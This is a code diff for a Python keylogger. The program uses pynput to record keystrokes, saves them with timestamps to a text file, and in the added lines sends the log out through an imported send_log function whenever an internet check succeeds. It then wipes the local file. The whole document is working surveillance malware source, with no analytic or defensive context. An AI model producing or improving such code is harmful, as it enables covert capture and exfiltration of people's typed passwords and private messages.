@@ -1,4 +1,5 @@
 import time
+from repository import internt_verify, send_log
 from pynput import keyboard
 
 
@@ -37,8 +38,12 @@ def save_senteces(senteces):
 
 	with open('senteces.txt',  'a') as f:
 		for time,text in senteces.items():
-			f.write(text + ' - ' + str(time))
-			f.write('\n')
+			f.write(text + ' - ' + str(time + '\n'))
+	
+	if(internt_verify()):
+		send_log()
+		#to clean senteces file, when data is sent
+		open('senteces.txt', 'w').close()
 
 if __name__ == '__main__':
 	with keyboard.Listener(on_press= on_press, on_release=on_release) as listener:
